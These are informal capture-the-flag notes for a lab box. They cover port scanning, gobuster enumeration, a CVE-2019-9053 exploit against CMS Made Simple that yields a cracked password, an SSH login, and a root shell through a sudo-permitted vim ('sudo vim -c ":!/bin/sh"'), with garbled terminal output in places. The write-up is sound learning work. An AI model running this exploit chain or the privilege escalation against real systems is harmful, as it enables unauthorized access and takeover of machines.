
#PORT SCAN 
-->
21/tcp   open  ftp   - Anonymous login allowed
80/tcp   open  http  - 
2222/tcp open  EtherNetIP-1 - ssh

#Directory enumeration
Using Gobusters :
--> gobuster dir -u http://10.48.148.198 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

Important files found : /simple , /robots.txt

/simple - from here cms made simple exploits found
and its CVE:Cve-2019-9053 --> found from exploits database

#downlaoded explot.py
nano exploit.py -> copied down payload
//
python3 exploit.py -u http://10.48.148.198/simple
-> found : 
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret



#SSH 
ssh user@ip -p 2222
got login inside ssh page 
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
root@ip-10-48-77-135:~# ssh mitch@10.48.148.198 -p 2222
The authenticity of host '[10.48.148.198]:2222 ([10.48.148.198]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.48.148.198]:2222' (ECDSA) to the list of known hosts.
mitch@10.48.148.198's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!
$ ls -la
total 36
drwxr-x--- 3 mitch mitch 4096 aug 19  2019 .
drwxr-xr-x 4 root  root  4096 aug 17  2019 ..
-rw------- 1 mitch mitch  178 aug 17  2019 .bash_history
-rw-r--r-- 1 mitch mitch  220 sep  1  2015 .bash_logout
-rw-r--r-- 1 mitch mitch 3771 sep  1  2015 .bashrc
drwx------ 2 mitch mitch 4096 aug 19  2019 .cache
-rw-r--r-- 1 mitch mitch  655 mai 16  2017 .profile
-rw-rw-r-- 1 mitch mitch   19 aug 17  2019 user.txt
-rw------- 1 mitch mitch  515 aug 17  2019 .viminfo
$ pwd
/home/mitch
$ cd ..
$ ls
mitch  sunbath
$ 
$ pwd
/home
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
$sudo vim -c "!/bin/sh"
[1] + Stopped                    sudo vim
Press ENTER or type command to continue[2] + Sttype  :q<Enter>          sudo to exit":!bin/sh"
$ whomai                                       type  :help<Enter>  or  <F1>  for on-line help
-sh: 24: whomai: not found                     type  :help version7<Enter>   for version info# 
# ls
# ^[[B^[[Bbath
/bin/sh: 3: 
$ sudo vim -c ':!/bin/sh'
            : not found
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
user.txt
# cd ..
# ls
mitch  sunbath
# cd sunbath
# s
/bin/sh: 9: s: not found
# ls
Desktop  Documents  Downloads  examples.desktop  Music	Pictures  Public  Templates  Videos
and finally on manual findings found root folder and inside root.txt 
finally gained root flag






























